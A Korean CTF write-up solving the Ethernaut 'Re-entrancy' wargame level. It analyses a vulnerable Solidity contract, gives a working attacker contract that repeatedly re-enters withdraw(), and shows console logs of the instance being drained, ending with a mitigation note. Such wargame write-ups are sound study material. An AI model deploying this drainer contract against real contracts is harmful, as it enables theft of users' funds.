https://teberr.notion.site/Ethernaut-Re-entrancy-4003b508c0f743369ca89ee6ca9278ed

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c03492c3-840f-4be8-846a-c70910cb538d/Untitled.png)

> 이번 레벨의 목표는 컨트랙트에 있는 모든 이더를 훔치는 것입니다.

힌트
- 신뢰할수 없는 컨트랙트는 예상하지 못한 코드를 실행할 수 있습니다.
- Fallback 함수
- Throw/revert 버블링
- 컨트랙트를 공격하는 가장 좋은 방법은 컨트랙트를 만들어서 공격할 때 일수도 있습니다.
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

# 코드 분석 및 공격 설계

```solidity
using SafeMath for uint256;
```

먼저 openzepplin의 SafeMath 함수를 사용하고 있기 때문에 덧셈과 뺄셈에서 일어날 수 있는 오버플로우 및 언더플로우는 기본적으로 대응하고 있다.

```solidity
  mapping(address => uint) public balances;
```

balances의 경우 주소와 자산값을 서로 매핑하여 주소별 자산을 저장하고 있는 딕셔너리다.

```solidity
  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }
```

donate함수의 경우 balances 딕셔너리의 주소에 받은 이더만큼(msg.value) 추가해주는 함수이다. 

```solidity
  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }
```

balances에 저장되어있는 주소who에 대응되는 값을 리턴해준다. 즉 주소를 전달해주면 이 컨트랙트에 저장되어 있는 그 주소의 자산을 알려준다.

```solidity
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

withdraw함수이며 이 문제의 핵심이다.  컨트랙트에 저장되어있는 msg.sender의 자산이 요청한 금액보다 크다면 msg.sender에게 요청받은 만큼의 이더를 전송하고 나서 컨트랙트의 저장된 msg.sender의 자산의 값을 줄여준다. 

이 코드가 왜 문제냐면 withdraw 함수를 호출한 msg.sender에게 이더를 보내기 때문에 msg.sender가 컨트랙트라면 msg.sender의 receive함수를 실행시킬 수 있기 때문이다.

즉 msg.sender의 receive함수에서 다시 이 withdraw 함수를 호출한다면 balances에 저장된 msg.sender의 자산이 줄어들기 전에 다시 withdraw 함수를 호출하게 된다.

즉 호출 순서가

1. msg.sender의 withdraw함수 호출
2. withdraw 함수내에서 msg.sender의 자산이 충분하다면 msg.sender에게 이더 전송
3. msg.sender가 컨트랙트라면 receive 함수 실행되며 receive함수 내에서 이 문제 컨트랙트의 withdraw 함수 호출
4. withdraw 함수가 실행되며 다시 msg.sender의 자산이 충분하다면 msg.sender에게 이더를 전송

의 순서를 컨트랙트 내에 이더가 없어 이더가 전송이 안될때 까지 계속해서 반복하게 되며 이 과정에서 자산을 검증하기 위한 balances[msg.sender]의 실행은 한번도 도달하지 않아 조건문이 의미가 없어진다.

즉 컨트랙트를 receive함수가 실행되면 문제 컨트랙트의 withdraw 함수를 호출하도록 짠 뒤 deposit을 통해 적당한 양의 이더를 넣은 뒤 넣어준 이더를 amount로 하여 withdraw 함수를 호출하게 하면 된다.

# 공격

먼저 컨트랙트에 있는 이더를 전부 가져올 것이므로 컨트랙트에 이더가 얼마나 있는지 확인해보자.

```solidity
=> Instance address
0x0C1D980ed569E3C8912F043AAB94b29797e4aa69
```

get new instance로 인해 인스턴스를 생성하면 주소를 알 수 있다.

![컨트랙트 자산.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1c8fdc2b-05d3-49e1-b3f5-f3bf63c3423a/%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8_%EC%9E%90%EC%82%B0.png)

```solidity
await web3.eth.getBalance('0x0C1D980ed569E3C8912F043AAB94b29797e4aa69')
'1000000000000000'
```

이 인스턴스 주소를 기반으로 얻어낸 문제 컨트랙트에 담겨있는 자산은 1,000,000,000,000,000Wei로 

10^15만큼 있다. 10^18이 1이더 이므로 0.001이더만큼 있다고 할 수 있다.

즉 0.001이더를 내 컨트랙트의 주소를 매개변수로하여 deposit하며 문제컨트랙트에 들어있는 이더를 0.002이더로 만든뒤 재진입(re-entrancy)공격을 통해 전부 탈취하자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack{
    IReentrance re_ent;
    uint target_balance=1000000000000000;

    constructor(address payable _addr) public { 
        re_ent=IReentrance(_addr);
    }

    function depo(uint256 amount) public payable{
        re_ent.donate{value:amount}(address(this));
    }

		function Attack() public payable{
        re_ent.withdraw(target_balance);
    }

    receive () external payable{
        re_ent.withdraw(target_balance);
    }
}
```

리믹스에서 코드를 짜서 deploy 해주었다.

```solidity
0xeD33b65475465E8F3D6aaB0b15d7536a7107291a
```

컨트랙트의 주소를 얻었으므로 일단 이 컨트랙트에서 depo를 실행하기 위해 이 컨트랙트에 0.001이더를 보내자.

![전송.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/777b3c43-9345-49f9-a6a4-685caf24b9f0/%EC%A0%84%EC%86%A1.png)

컨트랙트의 Receive 함수때문에 문제 인스턴스의 withdraw를 호출하겠지만 아무런 상관 없다. 문제 인스턴스의 balances[내 컨트랙트]값이 0이므로 조건이 충족되지 않아 실행이 안될것이기 때문이다. 

![depo.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0e52ef95-eba9-4e7b-9028-95b1159e4e80/depo.png)

이제 0.001이더가 들어왔으므로 이를 이용해 depo를 하자.

![내 컨트랙트 balance 값.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e83e0e92-3246-41f1-9e88-cddbea37c663/%EB%82%B4_%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8_balance_%EA%B0%92.png)

![증가한 컨트랙트 자산.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4742440-ddf3-4d9e-a2cf-13e9a6d2f892/%EC%A6%9D%EA%B0%80%ED%95%9C_%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8_%EC%9E%90%EC%82%B0.png)

```jsx
await contract.balanceOf('0xeD33b65475465E8F3D6aaB0b15d7536a7107291a')
o {negative: 0, words: Array(3), length: 2, red: null}
	length: 2
	negative: 0
	red: null
	words: (3) [13008896, 14901161, empty]
	[[Prototype]]: Object

await web3.eth.getBalance('0x0C1D980ed569E3C8912F043AAB94b29797e4aa69')
'2000000000000000'
```

depo를 하고난 후 문제 인스턴스의 balances[내 컨트랙트 주소]에 0.001이더가 제대로 들어갔는지 확인해보면 확실히 들어갔고 컨트랙트 전체에 저장된 이더도 늘어난 것을 볼 수 있다. 

![Attack.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95996933-ab2d-4665-8e03-e0e00fbc1538/Attack.png)

이제 Attack을 하여 Re-entrancy 공격을 통해 자산을 전부 빼오자.

![자산 증가.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/15aec327-23b1-48fe-b171-4db226a116cf/%EC%9E%90%EC%82%B0_%EC%A6%9D%EA%B0%80.png)

![비어버린 컨트랙트 자산.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1b278022-cb1f-46a0-b148-f0f5f8c41435/%EB%B9%84%EC%96%B4%EB%B2%84%EB%A6%B0_%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8_%EC%9E%90%EC%82%B0.png)

```jsx
await web3.eth.getBalance('0x0C1D980ed569E3C8912F043AAB94b29797e4aa69')
'0'
```

내 컨트랙트에 depo를 통해 입금했던 0.001이더가 아닌 문제 컨트랙트의 총 자산인 0.002이더를 빼온 것을 확인할 수 있다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e4c0d82d-4f11-40e0-89cd-cfb8411e7541/%EC%84%B1%EA%B3%B5.png)

문제의 목적인 컨트랙트의 모든 자산을 탈취하는 것을 성공하였으므로 제출하고나면 성공했음을 알 수 있다.

# 문제 후기

컨트랙트에서 이더가 이동할 때 re-entrancy 공격을 막기 위해서는 자산을 이동하기 전에 먼저 뺀 후에 조건 비교를 한 후 전송 결과에 따라서 다시 롤백하는 형식을 통해서 재진입 공격을 막을 수 있다.

이더리움에서 일어났던 The DAO 사건이 대표적인 재진입공격 예시이다.
